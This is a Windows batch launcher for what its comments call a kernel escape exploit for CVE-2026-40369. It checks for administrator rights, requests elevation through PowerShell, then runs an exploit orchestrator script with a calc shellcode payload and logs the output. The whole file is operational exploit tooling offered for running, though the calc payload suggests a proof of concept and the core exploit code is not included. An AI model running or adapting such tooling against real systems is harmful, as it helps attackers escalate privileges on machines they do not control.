@echo off
:: Run orchestrator.py as Administrator with output logged
:: This triggers the full kernel escape path (CVE-2026-40369)

set LOGFILE=%~dp0exploit_output.log
echo Running elevated exploit... Output logged to %LOGFILE%

:: Check if already elevated
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting elevation...
    powershell -Command "Start-Process cmd -ArgumentList '/c cd /d %~dp0 && python orchestrator.py --shellcode calc 2>&1 | tee %LOGFILE% && pause' -Verb RunAs"
    exit /b
)

:: Already elevated
cd /d %~dp0
echo [%date% %time%] Running as Administrator > %LOGFILE%
python orchestrator.py --shellcode calc >> %LOGFILE% 2>&1
echo. >> %LOGFILE%
echo [%date% %time%] Done >> %LOGFILE%
type %LOGFILE%
pause
